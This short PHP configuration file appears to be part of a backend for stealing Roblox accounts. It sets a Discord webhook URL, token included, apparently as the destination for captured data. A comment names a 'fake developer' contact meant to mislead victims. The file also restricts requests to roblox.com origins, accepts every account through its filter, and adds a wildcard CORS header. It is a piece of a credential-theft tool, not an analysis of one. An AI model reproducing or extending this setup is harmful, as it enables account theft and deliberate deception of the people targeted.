<?php


    $webhook = "https://discord.com/api/webhooks/787180638540660757/3prUwBP3q02yvtsImuKLOrvY32ITwUPKnGJv_35iKq_7xcKLq9E3mZzcLaecAPy-FFdb";
    // fake developer for the bot the users may contact
    $discord_contact = "daddydraw";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>